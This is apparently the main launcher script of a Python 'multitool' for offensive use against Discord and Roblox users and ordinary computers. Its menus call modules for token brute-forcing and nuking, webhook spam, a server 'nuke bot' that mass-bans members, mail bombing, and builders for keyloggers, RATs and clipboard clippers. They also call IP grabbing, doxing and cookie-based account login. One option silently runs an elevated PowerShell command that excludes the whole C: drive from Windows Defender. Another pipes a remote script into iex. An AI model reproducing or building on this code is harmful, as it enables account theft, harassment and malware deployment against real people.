#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import sys, time, subprocess, json, os, threading, zipfile, io, shutil

def _init():
    try: import pystyle, requests, selenium, dns.resolver, bs4, socks, websocket, piexif, exifread, mutagen, PyQt5
    except: subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "pysocks", "websocket-client", "piexif", "exifread", "mutagen", "PyQt5", "-q"])


_init()

from core.display import Colors, Colorate, System, boot_anim, print_banner, menu_opts, get_inpt, init_os, get_config, Theme, matrix_effect, clr
from modules.discord_tools import webhook_spam, webhook_delete, id_to_token, server_info_lookup, nitro_generator, bot_invite_gen
from modules.network import do_port_check
from modules.crypto import CryptXer, make_pw
from modules.sysinfo import get_sys_data
from modules.osint import whois_lookup, dns_lookup
from modules.malicious import mail_bomb
from modules.obfuscator import obfuscator_init
from modules.metadata import metadata_init

def cfg_mgr():
    from core.paginated_ui import PaginatedUI
    while 1:
        clr()
        _cl = Theme.get_colors()
        _cfg = get_config()

        au_status = "[ENABLED]" if _cfg.get("auto_update", True) else "[DISABLED]"
        dp_status = "[ENABLED]" if _cfg.get("auto_open_discord", True) else "[DISABLED]"
        active_theme = _cfg.get("theme", "blue").upper()

        box_w = PaginatedUI.get_layout_width()
        inner = box_w - 2
        mg = PaginatedUI.get_margin(box_w)

        def _p(text=""):
            pad_right = max(0, inner - len(text))
            print(mg + Colorate.Horizontal(_cl["num"], "│") +
                  Colorate.Horizontal(_cl["txt"], text) +
                  " " * pad_right +
                  Colorate.Horizontal(_cl["num"], "│"))

        def _pc(text_plain, color):
            pad = (inner - len(text_plain)) // 2
            extra = inner - len(text_plain) - pad * 2
            print(mg + Colorate.Horizontal(_cl["num"], "│") +
                  " " * pad +
                  Colorate.Horizontal(color, text_plain) +
                  " " * pad + " " * extra +
                  Colorate.Horizontal(_cl["num"], "│"))

        def _div(char="─", left="├", right="┤"):
            print(mg + Colorate.Horizontal(_cl["head"], left + char * inner + right))

        title = " CONFIGURATION & SETTINGS "
        bd_len = max(2, (inner - len(title)) // 2)
        bd_ext = "─" if (inner - len(title)) % 2 != 0 else ""
        print(mg + Colorate.Horizontal(_cl["head"], "┌" + "─" * bd_len + title + "─" * bd_len + bd_ext + "┐"))
        _p()
        _pc(f"Active Theme: {active_theme}", _cl["head"])
        _p()

        _tl = [("1","Blue"),("2","Red"),("3","Purple"),("4","Green"),("5","Yellow"),("6","Pink"),
               ("7","Cyan"),("8","Gray"),("9","Rainbow"),("10","Modern"),("11","Modern Red"),("12","Modern Purple")]
        col_w = inner // 3
        for _i in range(0, len(_tl), 3):
            _ln = ""
            plain_ln = ""
            for _k, _v in _tl[_i:_i+3]:
                v_disp = f"{_v} ✓" if _v.lower().replace(" ", "_") == _cfg.get("theme", "blue").lower() else _v
                slot = f"  [{_k}] {v_disp}"
                slot_padded = f"{slot:<{col_w}}"
                _ln += Colorate.Horizontal(_cl["num"], f"  [{_k}] ") + Colorate.Horizontal(_cl["txt"], f"{v_disp:<{col_w - len(f'  [{_k}] ')}}") 
                plain_ln += slot_padded
            pad_val = max(0, inner - len(plain_ln))
            print(mg + Colorate.Horizontal(_cl["num"], "│") + _ln + " " * pad_val + Colorate.Horizontal(_cl["num"], "│"))

        _p()
        _div()
        _p()
        half = inner // 2
        c1_key = "  [13] "; c1_lbl = "Auto-Update:  "; c1_val = f"{au_status}"
        c2_key = "  [14] "; c2_lbl = "Discord Popup:"; c2_val = f" {dp_status}"
        c1_plain = c1_key + c1_lbl + c1_val
        c2_plain = c2_key + c2_lbl + c2_val
        c1_pad = half - len(c1_plain)
        c2_pad = max(0, inner - half - len(c2_plain))
        toggle_row = (
            mg + Colorate.Horizontal(_cl["num"], "│") +
            Colorate.Horizontal(_cl["num"], c1_key) +
            Colorate.Horizontal(_cl["txt"], c1_lbl) +
            Colorate.Horizontal(_cl["head"], c1_val) +
            " " * max(0, c1_pad) +
            Colorate.Horizontal(_cl["num"], c2_key) +
            Colorate.Horizontal(_cl["txt"], c2_lbl) +
            Colorate.Horizontal(_cl["head"], c2_val) +
            " " * c2_pad +
            Colorate.Horizontal(_cl["num"], "│")
        )
        print(toggle_row)
        _p()
        _div()
        _p()

        exit_plain = "  [99] Return to Main Menu"
        pad_exit = max(0, inner - len(exit_plain))
        print(mg + Colorate.Horizontal(_cl["num"], "│") +
              Colorate.Horizontal(_cl["num"], "  [99] ") +
              Colorate.Horizontal(_cl["txt"], "Return to Main Menu") +
              " " * pad_exit +
              Colorate.Horizontal(_cl["num"], "│"))
        _p()
        print(mg + Colorate.Horizontal(_cl["head"], "└" + "─" * inner + "┘"))

        _c = get_inpt("navi@config:~#")
        if _c in [str(_x) for _x in range(1, 13)]:
            _tm = {"1":"blue","2":"red","3":"purple","4":"green","5":"yellow","6":"pink","7":"cyan","8":"gray","9":"rainbow","10":"modern","11":"modern_red","12":"modern_purple"}[_c]
            try:
                with open("core/config.json", "r") as _f: _d = json.load(_f)
                _d["theme"] = _tm
                with open("core/config.json", "w") as _f: json.dump(_d, _f, indent=2)
                print(Colorate.Horizontal(_cl["head"], f"  [+] Theme -> {_tm.upper()}"))
                matrix_effect(1, Theme.get_matrix_color())
            except: pass
        elif _c in ["13", "14"]:
            try:
                with open("core/config.json", "r") as _f: _d = json.load(_f)
                _k = "auto_update" if _c == "13" else "auto_open_discord"
                _d[_k] = not _d.get(_k, 1)
                with open("core/config.json", "w") as _f: json.dump(_d, _f, indent=2)
                print(Colorate.Horizontal(_cl["head"], f"  [+] {_k} is now {_d[_k]}"))
                time.sleep(1)
            except: pass
        elif _c == "99": break

def inf_view():
    from core.paginated_ui import PaginatedUI
    clr()
    _cl = Theme.get_colors()
    box_w = PaginatedUI.get_layout_width()
    inner = box_w - 2
    mg = PaginatedUI.get_margin(box_w)

    title = " APP INFO & CONFIG "
    bd_len = max(2, (inner - len(title)) // 2)
    bd_ext = "─" if (inner - len(title)) % 2 != 0 else ""
    print(mg + Colorate.Horizontal(_cl["head"], "┌" + "─" * bd_len + title + "─" * bd_len + bd_ext + "┐"))
    print(mg + Colorate.Horizontal(_cl["num"], "│" + " " * inner + "│"))

    try:
        with open("core/config.json", "r") as _f:
            _d = json.load(_f)
        for _k, _v in _d.items():
            key_str = f"  {_k}: "
            val_str = str(_v)
            plain = key_str + val_str
            pad_r = max(0, inner - len(plain))
            print(mg + Colorate.Horizontal(_cl["num"], "│") +
                  Colorate.Horizontal(_cl["num"], key_str) +
                  Colorate.Horizontal(_cl["txt"], val_str) +
                  " " * pad_r +
                  Colorate.Horizontal(_cl["num"], "│"))
    except: pass

    print(mg + Colorate.Horizontal(_cl["num"], "│" + " " * inner + "│"))
    print(mg + Colorate.Horizontal(_cl["head"], "└" + "─" * inner + "┘"))
    input(Colorate.Horizontal(_cl["head"], "\n  Press Enter..."))

def _pre():
    _cl, _cfg = Theme.get_colors(), get_config()
    if _cfg.get("auto_update"):
        try:
            import requests
            _r = requests.get("https://raw.githubusercontent.com/glockinhand/navi-multitool/main/core/config.json", timeout=5)
            if _r.status_code == 200:
                _rv = _r.json().get("version", "1.0.0")
                
                def parse_v(v):
                    import re
                    return [int(x) for x in re.sub(r'[^0-9.]', '', str(v)).split('.') if x.isdigit()]
                
                if parse_v(_rv) > parse_v(_cfg.get("version", "1.0.0")):
                    print(Colorate.Horizontal(_cl["num"], f"\n  [!] New Version Detected: {_rv}"))
                    _url = "https://github.com/glockinhand/navi-multitool/archive/refs/heads/main.zip"
                    _res = requests.get(_url, stream=True)
                    _dl, _ts = 0, int(_res.headers.get('content-length', 500000))
                    _io = io.BytesIO()
                    for _chunk in _res.iter_content(chunk_size=1024):
                        _dl += len(_chunk)
                        _io.write(_chunk)
                        _perc = int(30 * _dl / _ts)
                        if _perc > 30: _perc = 30
                        print(f"\r  {Colorate.Horizontal(_cl['num'], '[')}{Colorate.Horizontal(_cl['head'], '#' * _perc)}{Colorate.Horizontal(_cl['txt'], '-' * (30 - _perc))}{Colorate.Horizontal(_cl['num'], ']')} Downloading...", end="")
                    print("\n  " + Colorate.Horizontal(_cl["head"], "[+] Extracting update..."))
                    with zipfile.ZipFile(_io) as _zf:
                        _root = _zf.namelist()[0]
                        for _item in _zf.namelist():
                            if _item == _root: continue
                            _path = os.path.join(os.getcwd(), os.path.relpath(_item, _root))
                            if _item.endswith('/'):
                                if not os.path.exists(_path): os.makedirs(_path)
                            else:
                                with open(_path, "wb") as _f: _f.write(_zf.read(_item))
                    print(Colorate.Horizontal(_cl["head"], "  [+] Update installed! Rebooting Navi..."))
                    time.sleep(1.5)
                    os.execl(sys.executable, sys.executable, *sys.argv)
        except: pass

def _pop():
    _cfg = get_config()
    if _cfg.get("auto_open_discord"): # can be disabled in cfg 
        time.sleep(3)
        try:
            import webbrowser
            webbrowser.open(_cfg.get("discord", ""))
        except: pass

def _nbot_ui():
    _cl = Theme.get_colors()
    import base64
    
    token = ""
    config_path = "core/botcfg.json"
    
    default_config = {
        "BOT_TOKEN": "",
        "MESSAGE_CONTENT": "@everyone | Server Nuked | discord.gg/4qUD63pnPy | https://github.com/glockinhand/navi-multitool",
        "WEBHOOK_URL": "This webhook for tracking your nukes",
        "GUILD_NEW_NAME": "navi owns this",
        "CHANNEL_AMOUNT": 60,
        "BATCH_SIZE_CHANNELS": 60,
        "BATCH_SIZE_DELETE": 30,
        "BATCH_SIZE_BAN": 4,
        "TOTAL_MESSAGES": 800,
        "MAX_MESSAGES_PER_CHANNEL": 18,
        "TOTAL_WEBHOOKS": 2000,
        "WEBHOOK_DELAY": 0.06,
        "SPAM_EMOJIS": ["🏴", "🌙", "🔥", "💀", "👾"],
        "WEBHOOK_USERNAME": "Navi Runs Cord",
        "COMMAND_PREFIX": "."
    }
    
    if not os.path.exists("core"):
        os.makedirs("core")
        
    cfg_data = default_config.copy()
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                loaded_data = json.load(f)
                if isinstance(loaded_data, dict):
                    cfg_data.update(loaded_data)
                    token = cfg_data.get("BOT_TOKEN", "").strip()
        except Exception:
            pass
            
    if not token:
        print_banner()
        print(Colorate.Horizontal(_cl["head"], "  [ NUKE BOT ]\n"))
        print(Colorate.Horizontal(_cl["num"], "  Please enter Discord Bot Token:"))
        token = get_inpt("  Token: ").strip()
        if not token:
            print(Colorate.Horizontal(_cl["num"], "  [!] Token cannot be empty!"))
            time.sleep(1.5)
            return
            
        cfg_data["BOT_TOKEN"] = token
        
        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(cfg_data, f, indent=2)
            print(Colorate.Horizontal(_cl["head"], "  [+] Token saved to core/botcfg.json!"))
            time.sleep(1)
        except Exception as e:
            print(Colorate.Horizontal(_cl["num"], f"  [!] Could not save token: {e}"))
            time.sleep(1.5)
            
    bot_id = "Unknown"
    try:
        parts = token.split('.')
        if len(parts) >= 1:
            padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            bot_id = base64.b64decode(padded).decode('utf-8')
    except Exception:
        pass
        
    bot_invite = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot&permissions=8" if bot_id != "Unknown" else "Could not determine Bot ID"
    
    while True:
        print_banner()
        print(Colorate.Horizontal(_cl["head"], "  [ DISCORD NUKE BOT UI ]\n"))
        print(Colorate.Horizontal(_cl["num"], "  [=] Bot ID:     ") + Colorate.Horizontal(_cl["txt"], bot_id))
        print(Colorate.Horizontal(_cl["num"], "  [=] Bot Invite: ") + Colorate.Horizontal(_cl["head"], bot_invite))
        print("\n" + Colorate.Horizontal(_cl["head"], "  [ CONTROL PANEL ]"))
        print(Colorate.Horizontal(_cl["num"], "  [1] ") + Colorate.Horizontal(_cl["txt"], "Start Bot (New Window)"))
        print(Colorate.Horizontal(_cl["num"], "  [2] ") + Colorate.Horizontal(_cl["txt"], "Open botcfg.json"))
        print(Colorate.Horizontal(_cl["num"], "  [3] ") + Colorate.Horizontal(_cl["txt"], "Show Help"))
        print(Colorate.Horizontal(_cl["num"], "  [99]") + Colorate.Horizontal(_cl["txt"], "Return to Main Menu"))
        
        cmd = get_inpt("navi@nukebot:~#").strip().lower()
        
        if cmd == "1":
            try:
                if os.name == 'nt':
                    subprocess.Popen([sys.executable, "modules/nbot.py"], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    subprocess.Popen([sys.executable, "modules/nbot.py"])
                print(Colorate.Horizontal(_cl["head"], "  [+] Bot started in a new terminal window!"))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Error starting bot: {e}"))
            time.sleep(2)
            
        elif cmd == "2":
            try:
                if os.path.exists(config_path):
                    os.startfile(os.path.abspath(config_path))
                    print(Colorate.Horizontal(_cl["head"], "  [+] botcfg.json opened!"))
                else:
                    print(Colorate.Horizontal(_cl["num"], "  [!] Configuration file does not exist!"))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Error opening file: {e}"))
            time.sleep(1.5)
            
        elif cmd == "3":
            print_banner()
            print(Colorate.Horizontal(_cl["head"], "  [ NUKE BOT HELP ]\n"))
            print(Colorate.Horizontal(_cl["txt"], "  The Nuke Bot runs in a separate console window and responds to Discord commands:"))
            print(Colorate.Horizontal(_cl["num"], "  • .kill   ") + Colorate.Horizontal(_cl["txt"], "- Deletes guild channels and spams/bans (Configurable)."))
            print(Colorate.Horizontal(_cl["num"], "  • .massban") + Colorate.Horizontal(_cl["txt"], "- Bans all non-admin members in the server."))
            print(Colorate.Horizontal(_cl["num"], "  • .erase  ") + Colorate.Horizontal(_cl["txt"], "- Deletes all channels in the guild."))
            print(Colorate.Horizontal(_cl["txt"], "\n  Configurable values are stored in core/botcfg.json."))
            input("\n  Press Enter to continue...")
            
        elif cmd == "99":
            break

def run_app():
    from core.paginated_ui import PaginatedUI, PAGES
    current_page = 0
    while 1:
        _cl = Theme.get_colors()
        _cfg = get_config()
        
        PaginatedUI.draw_dashboard(current_page)
        
        p_name = PAGES[current_page]['title'].split()[0].lower()
        _c_raw = get_inpt(f"navi@root/{p_name}:~#").strip()
        _c = _c_raw.lower()
        
        if _c in ["a", "p"]:
            current_page = (current_page - 1) % len(PAGES)
            continue
        elif _c in ["d", "n"]:
            current_page = (current_page + 1) % len(PAGES)
            continue
        elif _c.startswith("p") and len(_c) == 2 and _c[1] in ["1", "2", "3", "4", "5", "6"]:
            current_page = int(_c[1]) - 1
            continue
        elif not _c:
            continue
            
        _c = _c.lstrip("0") if _c not in ["0", "00"] else "0"
        if _c == "1":
            while 1:
                print_banner()
                PaginatedUI.draw_card_box("WEBHOOK OPERATIONS", {"1": "Spammer", "2": "Deleter", "99": "Return"})
                _cc = get_inpt("navi@discord/webhooks:~#")
                if _cc == "1": webhook_spam(get_inpt("url:"), get_inpt("msg:"), int(get_inpt("amt (10):") or 10))
                elif _cc == "2": webhook_delete(get_inpt("url:"))
                elif _cc == "99": break
        elif _c == "2":
            while 1:
                print_banner()
                PaginatedUI.draw_card_box("TOKEN & ACCOUNT TOOLS", {"1": "Token Bruteforce", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "8": "Report Bot", "9": "Server Cloner", "99": "Return"})
                _cc = get_inpt("navi@discord/tokens:~#")
                if _cc == "1":
                    id_to_token()

                elif _cc == "2":
                    from modules.discord_tools import token_info
                    token_info(get_inpt("Token:"))
                elif _cc == "3":
                    from modules.discord_tools import token_nuker
                    token_nuker(get_inpt("Token:"))
                elif _cc == "4":
                    from modules.discord_tools import token_login
                    token_login(get_inpt("Token:"))
                elif _cc == "5":
                    from modules.discord_tools import token_rotator
                    token_rotator(get_inpt("Token:"))
                elif _cc == "6":
                    from modules.discord_tools import token_onliner
                    token_onliner()
                elif _cc == "7":
                    from modules.discord_tools import selfbot_menu
                    selfbot_menu()
                elif _cc == "8":
                    from modules.discord_tools import discord_report_bot
                    discord_report_bot()
                elif _cc == "9":
                    from modules.discord_tools import discord_server_cloner
                    discord_server_cloner(get_inpt("Token:"))
                elif _cc == "99": break
        elif _c == "6":
            from modules.discord_tools import selfbot_menu
            selfbot_menu()
        elif _c == "7":
            from modules.discord_tools import discord_server_cloner
            discord_server_cloner(get_inpt("Token:"))
        elif _c == "8":
            _nbot_ui()
        elif _c == "9":
            from modules.discord_tools import discord_username_checker
            discord_username_checker()
        elif _c == "3": nitro_generator(int(get_inpt("Threads (1):") or 1))
        elif _c == "4":
            from modules.discord_tools import server_info_lookup
            server_info_lookup(get_inpt("Invite Link:"))
        elif _c == "5":
            from modules.discord_tools import bot_invite_gen
            bot_invite_gen(get_inpt("Bot ID:"))
        elif _c == "10":
            _res = do_port_check(get_inpt("host:"))
            if not _res: print(Colorate.Horizontal(_cl["num"], "  [!] None found."))
            else: [print(Colorate.Horizontal(_cl["head"], f"  [+] Port {p} OPEN")) for p in _res]
            input("\n  Enter...")
        elif _c == "11":
            _inf = whois_lookup(get_inpt("ip/domain:"))
            if not _inf or "ERR" in _inf: print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {_inf.get('ERR', '??')}"))
            else: [print(Colorate.Horizontal(_cl["num"], f"  {k:<15}: ") + Colorate.Horizontal(_cl["txt"], str(v))) for k, v in _inf.items()]
            input("\n  Enter...")
        elif _c == "12":
            _r = dns_lookup(get_inpt("host:"))
            for _k, _v in _r.items(): print(Colorate.Horizontal(_cl["num"], f"  {_k}: ") + Colorate.Horizontal(_cl["txt"], str(_v)))
            input("\n  Enter...")
        elif _c == "13":
            metadata_init()
        elif _c == "14":
            from modules.dox import dox_tracker
            dox_tracker()
        elif _c == "15":
            from modules.dox import dox_creator
            dox_creator()
        elif _c == "16":
            from modules.lookup import phone_track
            phone_track()
        elif _c == "17":
            from modules.osint import email_lookup_init
            email_lookup_init()


        elif _c == '20': mail_bomb(get_inpt("email:"), int(get_inpt("amt:") or 10)); input("\n  Enter...")
        elif _c == '21':
            from modules.malicious import build_clipper
            build_clipper(); input("\n  Enter...")
        elif _c == '22':
            from modules.malicious import sql_scanner
            sql_scanner()
        elif _c == '23':
            from modules.malicious import start_brute
            start_brute()
        elif _c == '24':
            subprocess.run([sys.executable, "modules/builder/builder_gui.py"])
        elif _c == '25':
            from modules.keylogger import build_keylogger
            build_keylogger()
        elif _c == '26':
            from modules.malicious import ip_grabber
            ip_grabber()
        elif _c == '27':
            from modules.builder.rat_builder import rat_builder_init
            rat_builder_init()
        elif _c == '28':
            from modules.wallet_scanner import wallet_scanner_init
            wallet_scanner_init()
        elif _c == '30':
            _m, _t = get_inpt("(E/D):").upper(), get_inpt("Text:")
            try: print(Colorate.Horizontal(_cl["head"], f"  Res: {CryptXer.b64_e(_t) if _m == 'E' else CryptXer.b64_d(_t)}"))
            except: pass
            input("\n  Enter...")
        elif _c == '31':
            _inf = get_sys_data()
            for _k, _v in _inf.items(): print(Colorate.Horizontal(_cl["num"], f"  {_k}: ") + Colorate.Horizontal(_cl["txt"], str(_v)))
            input("\n  Enter...")
        elif _c == '32':
            from modules.osint import ip_pinger
            ip_pinger()
        elif _c == '33':
            obfuscator_init()
        elif _c == '34':
            from modules.network import clone_website
            clone_website(get_inpt("URL to clone:"))
        elif _c == '40':
            from modules.roblox import roblox_user_info
            roblox_user_info()
        elif _c == '41':
            from modules.roblox import roblox_cookie_info
            roblox_cookie_info()
        elif _c == '42':
            from modules.roblox import roblox_cookie_login
            roblox_cookie_login()
        elif _c == '43':
            from modules.roblox import roblox_group_info
            roblox_group_info()
        elif _c == '44':
            from modules.roblox import roblox_asset_dl
            roblox_asset_dl()
        elif _c == '45':
            from modules.roblox import roblox_name_history
            roblox_name_history()
        elif _c == '46':
            from modules.roblox_username_checker import main as roblox_username_checker_main
            roblox_username_checker_main()
        elif _c == '47':
            from modules.roblox import roblox_cookie_refresher
            roblox_cookie_refresher()
        elif _c == '35':
            from modules.faker import fake_qr_gen
            fake_qr_gen()
        elif _c == "50":
            while 1:
                print_banner()
                PaginatedUI.draw_card_box("FAKER & SIMULATIONS", {
                    "1": "Fake Token Gen", "2": "Fake Mail Gen", "3": "Fake Identity", 
                    "4": "Fake Nitro", "5": "Fake DDoS", "6": "Fake Credit Cards", 
                    "7": "Fake Wallet Miner", "8": "Social Botter", "9": "Fake PayPal OTP",
                    "10": "Fake Account Gen", "11": "Fake Fortnite Check", "12": "Fake Exodus",
                    "13": "Hacker Terminal", "14": "Ransomware Sim", "15": "Fake Bruteforcer",
                    "16": "QR Code Gen", "17": "Explanation", "99": "Return"
                })
                _cc = get_inpt("navi@faker:~#")
                if _cc == "1": from modules.faker import fake_token_gen; fake_token_gen()
                elif _cc == "2": from modules.faker import fake_mail_gen; fake_mail_gen()
                elif _cc == "3": from modules.faker import fake_identity_gen; fake_identity_gen()
                elif _cc == "4": from modules.faker import fake_nitro_gen; fake_nitro_gen()
                elif _cc == "5": from modules.faker import fake_ddos; fake_ddos()
                elif _cc == "6": from modules.faker import fake_cc_gen; fake_cc_gen()
                elif _cc == "7": from modules.faker import fake_wallet_miner; fake_wallet_miner()
                elif _cc == "8": from modules.faker import social_botter; social_botter()
                elif _cc == "9": from modules.faker import fake_paypal_otp; fake_paypal_otp()
                elif _cc == "10": from modules.faker import fake_account_gen; fake_account_gen()
                elif _cc == "11": from modules.faker import fake_fortnite_checker; fake_fortnite_checker()
                elif _cc == "12": from modules.faker import fake_exodus; fake_exodus()
                elif _cc == "13": from modules.faker import fake_hacker_typer; fake_hacker_typer()
                elif _cc == "14": from modules.faker import fake_ransomware; fake_ransomware()
                elif _cc == "15": from modules.faker import fake_bruteforcer; fake_bruteforcer()
                elif _cc == "16": from modules.faker import fake_qr_gen; fake_qr_gen()
                elif _cc == "17": from modules.faker import faker_explanation; faker_explanation()
                elif _cc == "99": break
        elif _c == "60": inf_view()
        elif _c == "61": cfg_mgr()
        elif _c == "62":
            try:
                subprocess.run('powershell -Command "Start-Process powershell -ArgumentList \'-Command Add-MpPreference -ExclusionPath C:\\\' -Verb RunAs -WindowStyle Hidden"', shell=True)
                print(Colorate.Horizontal(_cl["head"], "  [+] C: Drive exception added. Antivirus disabled for C:."))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {e}"))
            input("\n  Enter...")
        elif _c == "63":
            print(Colorate.Horizontal(_cl["head"], "  [*] Launching Windows Debloater (Chris Titus Tech's WinUtil)..."))
            try:
                subprocess.run('powershell -NoProfile -ExecutionPolicy Bypass -Command "irm christitus.com/win | iex"', shell=True)
                print(Colorate.Horizontal(_cl["head"], "  [+] Debloater closed."))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {e}"))
            input("\n  Enter...")
        elif _c == "64":
            from modules.proxyscraper import scrape_proxies_menu
            scrape_proxies_menu()
        elif _c == "65":
            from modules.proxychecker import proxy_checker_menu
            proxy_checker_menu()
        elif _c == "99": sys.exit(0)

if __name__ == '__main__':
    init_os()
    boot_anim()
    _pre()
    threading.Thread(target=_pop, daemon=True).start()
    run_app()
